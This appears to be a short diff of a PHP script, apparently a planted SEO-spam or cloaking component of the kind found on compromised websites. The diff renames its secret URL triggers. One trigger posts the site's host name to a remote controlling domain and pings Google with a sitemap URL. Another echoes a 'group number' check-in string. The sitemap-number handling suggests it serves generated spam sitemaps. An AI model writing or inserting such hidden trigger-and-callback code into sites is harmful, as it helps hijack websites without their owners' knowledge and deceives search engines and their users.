@@ -14,7 +14,7 @@ if (is_https()) {
     $ht = "http";
 }
 $pingurl = "https://www.google.com/ping?sitemap=" . $pingurl;
-if (stripos($_SERVER['REQUEST_URI'], 'pingsitemap') !== false) {
+if (stripos($_SERVER['REQUEST_URI'], 'pingsitemap1028') !== false) {
     $url = "http://" . $siteYuming . "/pingsitemap";
     $post_data = array(
         'hostName' => $hostName
@@ -32,8 +32,8 @@ if (stripos($_SERVER['REQUEST_URI'], 'pingsitemap') !== false) {
     }
     exit;
 }
-if (stripos($_SERVER['REQUEST_URI'], 'testurl123') !== false) {
-    echo "success:D1-2Ok" . $siteYuming;
+if (stripos($_SERVER['REQUEST_URI'], 'test654321') !== false) {
+    echo "组号-->" . $siteYuming;
     exit;
 }
 preg_match('/sitemap(\d+).xml/', $_SERVER['REQUEST_URI'], $matchsitemap);
